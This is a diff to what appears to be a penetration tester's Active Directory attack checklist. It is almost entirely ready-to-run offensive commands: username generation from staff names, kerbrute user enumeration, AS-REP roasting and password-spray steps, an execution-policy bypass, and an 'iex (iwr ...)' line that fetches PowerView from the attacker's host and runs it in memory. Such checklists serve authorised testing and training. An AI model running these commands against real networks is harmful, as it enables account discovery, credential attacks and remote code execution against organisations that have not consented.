@@ -19,7 +19,8 @@ sort -u -o users.txt users.txt
 - [ ] Anonymous LDAP answers: the users and their descriptions, from :Pb ldap
 Staff names from the website, one First Last per line in names.txt, turned into candidates:
 username-anarchy --input-file names.txt --select-format first,flast,first.last,firstl > candidates.txt
-kerbrute userenum -d <Domain> --dc <DCIP> candidates.txt -o kerbrute.txt
+kerbrute userenum -d <Domain> --dc <DCIP> candidates.txt -o kerbrute2.txt
+grep 'VALID USERNAME' kerbrute2.txt | awk '{print $NF}' | cut -d '@' -f1 >> users.txt
 - [ ] A user kerbrute says has no pre auth: :Pb asrep
 - [ ] The lockout threshold from nxc smb <DCIP> -u '' -p '' --pass-pol before any spraying
 Each username as its own password, once:
@@ -75,9 +76,9 @@ net user /domain
 net group "Domain Admins" /domain
 net accounts /domain
 nltest /domain_trusts
-PowerView, copied from /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 into upload/ for serve:
+PowerView, copied from /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 into upload/ for serve; THE-SERVE-URL is the address serve files powerview prints:
 powershell -ep bypass
-iex (iwr -UseBasicParsing http://<LHOST>/PowerView.ps1)
+iex (iwr -UseBasicParsing THE-SERVE-URL)
 Get-DomainUser -Properties samaccountname, description, memberof, pwdlastset | Format-Table
 Get-DomainUser -SPN -Properties samaccountname, serviceprincipalname
 Get-DomainUser -PreauthNotRequired -Properties samaccountname
